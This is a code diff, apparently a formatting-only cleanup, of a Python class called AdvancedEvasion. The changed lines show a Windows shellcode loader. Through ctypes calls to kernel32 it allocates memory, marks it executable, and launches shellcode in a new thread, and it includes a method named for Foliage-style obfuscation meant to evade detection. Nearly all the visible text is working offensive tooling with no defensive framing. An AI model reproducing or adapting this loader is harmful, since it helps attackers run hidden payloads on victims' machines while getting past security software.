@@ -16,8 +16,8 @@ class AdvancedEvasion:
     MEM_RESERVE = 0x2000
 
     def __init__(self):
-        self.kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
-        self.ntdll = ctypes.WinDLL('ntdll', use_last_error=True)
+        self.kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
+        self.ntdll = ctypes.WinDLL("ntdll", use_last_error=True)
 
     def foliage_obfuscation(self, payload: bytes):
         """
@@ -52,10 +52,7 @@ class AdvancedEvasion:
 
         # Allocate RW memory first
         address = self.kernel32.VirtualAlloc(
-            None,
-            size,
-            self.MEM_COMMIT | self.MEM_RESERVE,
-            self.PAGE_READWRITE
+            None, size, self.MEM_COMMIT | self.MEM_RESERVE, self.PAGE_READWRITE
         )
         if not address:
             raise MemoryError("VirtualAlloc failed to allocate memory.")
@@ -66,10 +63,7 @@ class AdvancedEvasion:
         # Change memory protection to executable
         old_protect = ctypes.c_ulong()
         success = self.kernel32.VirtualProtect(
-            address,
-            size,
-            self.PAGE_EXECUTE_READ,
-            ctypes.byref(old_protect)
+            address, size, self.PAGE_EXECUTE_READ, ctypes.byref(old_protect)
         )
         if not success:
             self.kernel32.VirtualFree(address, 0, 0x8000)  # MEM_RELEASE
@@ -77,14 +71,7 @@ class AdvancedEvasion:
 
         # Create a thread to run the shellcode
         thread_id = ctypes.c_ulong()
-        h_thread = self.kernel32.CreateThread(
-            None,
-            0,
-            address,
-            data,
-            0,
-            ctypes.byref(thread_id)
-        )
+        h_thread = self.kernel32.CreateThread(None, 0, address, data, 0, ctypes.byref(thread_id))
         if not h_thread:
             self.kernel32.VirtualFree(address, 0, 0x8000)
             raise OSError("CreateThread failed.")
